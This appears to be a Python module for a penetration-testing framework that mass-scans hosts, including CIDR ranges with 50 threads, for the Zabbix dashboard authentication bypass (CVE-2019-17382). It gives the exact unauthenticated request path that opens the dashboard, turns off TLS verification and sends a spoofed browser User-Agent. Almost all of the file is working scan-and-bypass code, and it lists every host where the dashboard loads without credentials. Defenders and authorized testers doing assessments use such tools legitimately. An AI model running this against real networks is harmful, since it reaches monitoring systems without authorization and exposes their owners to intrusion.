import ssl
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from core import colors
from core.auxiliary import Auxiliary
from core.check import CheckResult
from core.module import Option
from core.progress import ProgressBar


ZABBIX_PATHS = ["/", "/zabbix/"]
VULN_PATH = "/zabbix.php?action=dashboard.view&dashboardid=1"


@dataclass
class HostResult:
    host: str
    state: str = "unknown"
    detail: str = ""
    path: str = ""


class ZabbixAuthBypassScanner(Auxiliary):
    NAME = "Zabbix Authentication Bypass Scanner (CVE-2019-17382)"
    DESCRIPTION = (
        "Detects Zabbix installations vulnerable to the dashboard.view "
        "authentication bypass (CVE-2019-17382). Identifies Zabbix by "
        "response signature, then requests the dashboard endpoint without "
        "credentials. If the dashboard renders, the target is vulnerable."
    )
    AUTHOR = "K3ysTr0K3R"
    RANK = "excellent"
    DISCLOSED = "2019-10-08"
    CHECK = True
    REFERENCES = [
        "CVE-2019-17382",
        "https://nvd.nist.gov/vuln/detail/CVE-2019-17382",
        "https://support.zabbix.com/browse/ZBX-17180",
    ]

    OPTIONS = [
        Option("RHOSTS", required=True,
               description="target(s): host | h1,h2 | CIDR | range | file:path"),
        Option("RPORT", default=80, type=int, description="HTTP port"),
        Option("SSL", default=False, type=bool, description="use HTTPS"),
        Option("TIMEOUT", default=10.0, type=float, description="per-request timeout"),
        Option("THREADS", default=50, type=int, description="concurrent workers"),
        Option("STOP_ON_FIRST", default=False, type=bool,
               description="stop after first vulnerable host"),
    ]

    def _expand_targets(self):
        hosts = self.resolve_targets()
        if not hosts:
            raise ValueError("no targets - set RHOSTS")
        if len(hosts) > 1:
            print(colors.info("target list -> " + str(len(hosts)) + " hosts"))
        return hosts

    def _base_url(self, host):
        scheme = "https" if self.options["SSL"] else "http"
        return scheme + "://" + host + ":" + str(self.options["RPORT"])

    def _get(self, host, path):
        url = self._base_url(host) + path
        ctx = ssl._create_unverified_context()
        req = urllib.request.Request(url)
        req.add_header(
            "User-Agent",
            "Mozilla/5.0 (Linux; Android 4.4.2; GT-I9500 Build/KOT49H) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 "
            "Mobile Safari/537.36"
        )
        with urllib.request.urlopen(req, timeout=self.options["TIMEOUT"], context=ctx) as r:
            return r.status, r.read().decode(errors="replace")

    def _probe(self, host):
        found_prefix = None
        for prefix in ZABBIX_PATHS:
            try:
                st, body = self._get(host, prefix)
            except urllib.error.URLError as e:
                return HostResult(host, "unknown", type(e).__name__)
            except urllib.error.HTTPError:
                continue

            if st == 200 and "Zabbix" in body:
                found_prefix = prefix
                break

        if not found_prefix:
            return HostResult(host, "safe", "not Zabbix")

        probe_path = found_prefix.rstrip("/") + VULN_PATH

        try:
            st, body = self._get(host, probe_path)
        except urllib.error.HTTPError as e:
            if e.code in (401, 403, 302):
                return HostResult(host, "safe", "bypass blocked (HTTP " + str(e.code) + ")")
            return HostResult(host, "safe", "HTTP " + str(e.code))
        except urllib.error.URLError as e:
            return HostResult(host, "unknown", type(e).__name__)

        if st == 200 and "Dashboard" in body:
            return HostResult(host, "vulnerable", "dashboard bypassed", probe_path)

        if st == 200:
            return HostResult(host, "safe", "200 without dashboard")

        return HostResult(host, "safe", "HTTP " + str(st))

    def check(self):
        targets = self._expand_targets()
        host = targets[0]
        print(colors.info("check: probing " + self._base_url(host)))
        r = self._probe(host)
        if r.state == "vulnerable":
            print(colors.vuln("check: " + host + " vulnerable (" + r.detail + ")"))
            print(colors.dimmed("  path: " + r.path))
            return CheckResult.VULNERABLE
        if r.state == "safe":
            print(colors.safe("check: " + host + " not vulnerable (" + r.detail + ")"))
            return CheckResult.SAFE
        print(colors.warn("check: " + host + " unknown (" + r.detail + ")"))
        return CheckResult.UNKNOWN

    def action(self):
        targets = self._expand_targets()
        threads = max(1, self.options["THREADS"])
        stop_first = self.options["STOP_ON_FIRST"]

        print(colors.info("scanning " + str(len(targets)) + " host(s) with " + str(threads) + " threads"))
        bar = ProgressBar(total=len(targets), prefix="scan")
        hits = []
        clean = 0
        unknown = 0
        aborted = False

        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(self._probe, h): h for h in targets}
                for fut in as_completed(futures):
                    bar.tick()
                    try:
                        r = fut.result()
                    except Exception:
                        unknown += 1
                        continue
                    if r.state == "vulnerable":
                        hits.append(r)
                        bar.log(colors.vuln(r.host + " - " + r.detail))
                        if stop_first:
                            aborted = True
                            for f in futures:
                                f.cancel()
                            break
                    elif r.state == "safe":
                        clean += 1
                    else:
                        unknown += 1
        finally:
            bar.done()

        print()
        print(colors.heading("--- scan summary ---"))
        print("  targets:      " + str(len(targets)))
        print("  vulnerable:   " + colors.green(str(len(hits))))
        print("  not vuln:     " + colors.dimmed(str(clean)))
        print("  unknown:      " + colors.yellow(str(unknown)))
        if aborted:
            print(colors.warn("  scan aborted early (STOP_ON_FIRST)"))
        if hits:
            print(colors.heading("  vulnerable hosts:"))
            for h in hits:
                print("    " + colors.vuln(h.host) + "  " + colors.dimmed(h.path))

        return hits
